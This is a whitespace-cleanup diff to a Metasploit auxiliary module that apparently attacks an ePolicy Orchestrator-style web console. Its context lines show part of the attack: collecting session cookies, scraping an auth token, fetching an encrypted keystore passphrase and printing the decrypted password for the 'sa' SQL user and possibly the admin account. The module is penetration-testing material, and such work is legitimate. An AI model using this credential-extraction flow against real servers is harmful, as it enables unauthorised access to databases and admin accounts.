@@ -34,7 +34,7 @@ class Metasploit3 < Msf::Auxiliary
       'License'        => MSF_LICENSE,
       'Author'         =>
         [
-          'Brandon Perry <bperry.volatile[at]gmail.com>', #metasploit module
+          'Brandon Perry <bperry.volatile[at]gmail.com>' #metasploit module
         ],
       'References'     =>
         [
@@ -70,7 +70,7 @@ class Metasploit3 < Msf::Auxiliary
     unless res
       fail_with(Failure::Unknown, "Server did not respond in an expected way")
     end
-    
+
     cookie = res.get_cookies
 
     res = send_request_cgi({
@@ -86,14 +86,14 @@ class Metasploit3 < Msf::Auxiliary
     unless res
       fail_with(Failure::Unknown, "Server did not respond in an expected way")
     end
-    
+
     cookie = res.get_cookies
 
     res = send_request_cgi({
       'uri' => normalize_uri(target_uri.path, 'core', 'orionSplashScreen.do'),
       'cookie' => cookie
     })
-    
+
     unless res
       fail_with(Failure::Unknown, "Server did not respond in an expected way")
     end
@@ -116,7 +116,7 @@ class Metasploit3 < Msf::Auxiliary
     unless res
       fail_with(Failure::Unknown, "Server did not respond in an expected way")
     end
-    
+
     auth_token = $1 if res.body =~ /id="orion.user.security.token" value="(.*)"\/>/
 
     res = send_request_cgi({
@@ -228,7 +228,7 @@ class Metasploit3 < Msf::Auxiliary
     if res.code == 404
       fail_with(Failure::Unknown, "Server likely has mitigation in place")
     end
-    
+
     print_status("Getting encrypted passphrase value from keystore.properties file...")
 
     res = send_request_cgi({
@@ -255,5 +255,5 @@ class Metasploit3 < Msf::Auxiliary
 
     print_good("The decrypted password for the keystore, 'sa' SQL user (if using local instance), and possibly 'admin' is: #{passphrase}")
   end
-  
+
 end
